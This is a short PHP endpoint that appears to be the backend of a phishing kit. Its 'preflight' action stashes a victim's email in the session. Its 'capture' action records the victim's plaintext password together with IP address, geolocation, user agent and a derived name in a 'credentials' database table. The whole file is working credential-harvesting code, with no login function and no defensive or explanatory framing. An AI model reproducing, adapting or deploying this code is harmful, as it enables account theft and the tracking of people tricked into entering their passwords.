<?php
require_once __DIR__ . '/functions.php';
header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

$action = $_POST['action'] ?? '';

if ($action === 'preflight') {
    $email = trim($_POST['email'] ?? '');
    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) { http_response_code(400); exit; }
    $_SESSION['pending_email'] = $email;
    $_SESSION['email_captured'] = $email;
    echo json_encode(['status' => 'ok', 'email' => $email]);
    exit;
}

if ($action === 'capture') {
    $email = trim($_POST['email'] ?? $_SESSION['pending_email'] ?? '');
    $password = $_POST['password'] ?? '';
    if (empty($email) || empty($password)) { http_response_code(400); exit; }

    $ip = getClientIP();
    $geo = getGeolocation($ip);
    $name = extractNameFromEmail($email);
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $stmt = $pdo->prepare("INSERT INTO credentials (name, email, password, ip, user_agent, country, city, latitude, longitude) VALUES (:name, :email, :password, :ip, :ua, :country, :city, :lat, :lon)");
    $stmt->execute([':name'=>$name,':email'=>$email,':password'=>$password,':ip'=>$ip,':ua'=>$ua,':country'=>$geo['country']??'',':city'=>$geo['city']??'',':lat'=>$geo['lat']??null,':lon'=>$geo['lon']??null]);
    unset($_SESSION['pending_email']);
    echo json_encode(['status' => 'ok']);
    exit;
}

http_response_code(400);
